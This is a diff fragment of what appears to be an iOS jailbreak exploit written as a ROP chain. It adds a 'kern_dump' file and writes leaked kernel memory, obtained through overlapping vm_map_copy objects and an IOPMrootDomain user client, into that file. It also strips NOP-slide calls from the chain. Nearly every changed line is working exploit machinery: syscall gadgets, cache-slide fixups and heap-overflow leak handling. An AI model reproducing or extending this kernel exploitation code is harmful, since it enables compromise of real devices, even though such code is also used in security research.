@@ -981,11 +981,13 @@ StoreR0(push, where)
         char rootdomainuserclient_match[256];
         char a[256];
         char b[256];
+        char c[256];
         char msga[256];
         char msgb[256];
         int zero;
         int fd1;
         int fd2;
+        int fd3;
         char* oflow_leakedbytes;
         struct vm_map_copy* oflow_vm_map;
         oolmsg_t oolmsg_template;
@@ -1055,20 +1057,19 @@ StoreR0(push, where)
     strcpy(argss->rootdomainuserclient_match, "<dict><key>IOProviderClass</key><string>IOPMrootDomain</string></dict>");
     strcpy(argss->a, "/var/mobile/Media/kjc_jb.log");
     strcpy(argss->b, "/var/mobile/Media/vm_map_dump");
+    strcpy(argss->c, "/var/mobile/Media/kern_dump");
     strcpy(argss->msga, "found overlapping object\n");
     strcpy(argss->msgb, "found overlapped object\n");
     strcpy(argss->testmsg, "ret: %08x\n");
     
     RopFixupLR(PUSH);
     RopCallFunction2(PUSH, @"___syscall", 294, SEG_VAR(cache_slide));
-    RopNopSlide(PUSH);
     RopCallFunction3(PUSH, @"_open", SEG_VAR(a), O_RDWR|O_CREAT|O_APPEND, 0666);
-    RopNopSlide(PUSH);
     StoreR0(PUSH, SEG_VAR(fd1));
-    
     RopCallFunction3(PUSH, @"_open", SEG_VAR(b), O_RDWR|O_CREAT|O_TRUNC, 0666);
-    RopNopSlide(PUSH);
     StoreR0(PUSH, SEG_VAR(fd2));
+    RopCallFunction3(PUSH, @"_open", SEG_VAR(c), O_RDWR|O_CREAT|O_TRUNC, 0666);
+    StoreR0(PUSH, SEG_VAR(fd3));
     
     RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceOpen), SEG_VAR(cache_slide));
     RopAddWriteDeref(PUSH, SEG_VAR(_IOServiceWaitQuiet), SEG_VAR(cache_slide));
@@ -1555,7 +1556,7 @@ step(i);\
         ReadWriteScratchOverlap();
         
         ReadWriteOverlapped512();
-        RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
+        RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd3), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
     }
     
     
